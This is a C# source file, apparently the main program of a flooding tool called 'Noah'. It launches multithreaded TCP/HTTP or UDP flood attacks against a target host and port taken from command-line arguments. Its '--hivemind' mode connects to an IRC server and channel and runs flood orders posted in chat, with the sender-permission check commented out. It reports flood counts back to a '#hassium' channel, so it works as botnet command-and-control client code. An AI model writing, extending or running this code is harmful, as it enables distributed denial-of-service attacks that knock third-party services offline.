using System;
using System.Threading;

using JRCLib;
using Noah.Attacks;

namespace Noah
{
    class MainClass
    {
        private static ApplicationState state;
        private static IRCClient client;
        public static void Main(string[] args)
        {
            if (args.Length > 0)
            {
                if (args[0] == "--hivemind")
                    enterHivemind(args);
                else
                    enterCli(args);
            }
            else
                enterCli(args);

            
        }

        private static void enterCli(string[] args)
        {
            state = new ArgumentParser(args).Parse();
            state.AttackCompleted += state_OnAttackCompletedCli;
            IAttack attack = null;

            switch (args[0].ToLower())
            {
                case "tcp":
                    attack = new HTTPAttack(state, args[1], state.Port);
                    break;
                case "udp":
                    attack = new UDPAttack(state, args[1], state.Port);
                    break;
                default:
                    Console.WriteLine("Unknown protocol: " + args[0]);
                    Environment.Exit(0);
                    break;
            }

            for (int i = 0; i < state.Threads; i++)
                attack.BeginAttack();
            Thread.Sleep(state.TimeAllocated);
            state.State = States.Done;
        }

        private static void state_OnAttackCompletedCli(object sender, AttackCompletedEventArgs e)
        {
            if (state.ShowTime)
                Console.WriteLine("Total elapsed time: " + state.StopWatch.Elapsed.Seconds);
            if (state.ShowFlood)
                Console.WriteLine("Total flood count: " + state.FloodCount.ToString());
            Environment.Exit(0);
        }

        private static void enterHivemind(string[] args)
        {
            if (args.Length < 4)
            {
                Console.WriteLine("Missing IP, port, or channel!");
                Environment.Exit(0);
            }

            client = new IRCClient(args[1], Convert.ToInt32(args[2]), Environment.UserName + new Random().Next(0, 10), "#" + args[3], true);
            client.MessageRecieved += client_OnMessageRecieved;
            client.Connect();
            client.BeginListening();
        }

        private static void client_OnMessageRecieved(object sender, MessageRecievedEventArgs e)
        {
            IRCMessage message = IRCMessage.Parse(e.RawMessage);
            switch (message.Type)
            {
                case IRCMessageType.PRIVMSG:
                    Console.WriteLine(message.Sender);
 //                   if ((message.Sender.StartsWith("@") || message.Sender.StartsWith("~")) && message.Body.StartsWith("!noah"))
   //                 {
                        Console.WriteLine("Got an order! " + message.Body);
                        string[] args = message.Body.Split(' ');
                        state = new ArgumentParser(args).Parse();
                        IAttack attack = null;
                        switch (args[1].ToLower())
                        {
                            case "tcp":
                                attack = new HTTPAttack(state, args[2], state.Port);
                                break;
                            case "udp":
                                attack = new UDPAttack(state, args[2], state.Port);
                                break;
                            default:
                                client.SendPRIVMSG("Unknown protocol " + args[1], message.Channel);
                                return;
                        }
                        state.AttackCompleted += state_OnAttackCompletedHivemind;
                        for (int i = 0; i < state.Threads; i++)
                            attack.BeginAttack();
                        Thread.Sleep(state.TimeAllocated);
                        state.State = States.Done;
   //                }
                    break;
            }
        }

        private static void state_OnAttackCompletedHivemind(object sender, AttackCompletedEventArgs e)
        {
            if (state.ShowTime)
                client.SendPRIVMSG("#hassium", "Total elapsed time: " + state.StopWatch.Elapsed.Seconds);
            if (state.ShowFlood)
                client.SendPRIVMSG("#hassium", "Total flood count: " + state.FloodCount.ToString());
        }
    }
}